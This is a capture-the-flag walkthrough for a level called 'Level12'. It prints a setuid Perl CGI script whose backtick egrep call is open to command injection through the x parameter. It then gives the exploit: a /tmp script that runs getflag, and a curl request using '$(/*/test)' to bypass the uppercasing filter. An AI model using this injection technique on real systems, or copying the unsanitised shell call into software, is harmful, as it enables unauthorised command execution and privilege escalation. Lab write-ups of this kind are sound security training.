# Level12
## Step by step
- In the user `level12` home directory, there is a file
  ```bash
  > ls
  -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
  ```
- The `level12` fiel contains a program that  execute a CGI on request from localhost:4646 and take 2 querystrings `x` and `y`
  ```bash
  > cat level12.pl 
  #!/usr/bin/env perl
  # localhost:4646
  use CGI qw{param};
  print "Content-type: text/html\n\n";
  
  sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
  }
  
  sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
  }
  
  n(t(param("x"), param("y")));
  ```
- The goal is to execute a command in ``@output = `egrep "^$xx" /tmp/xd 2>&1`;``
  ```bash
  > cat <<hey >/tmp/TEST
  > #!/bin/bash
  > getflag > /tmp/flag
  > hey

  > chmod +x /tmp/TEST

  > curl localhost:4646?x='$(/*/test)'

  > cat /tmp/flag
  Check flag.Here is your token : XXX
```
  
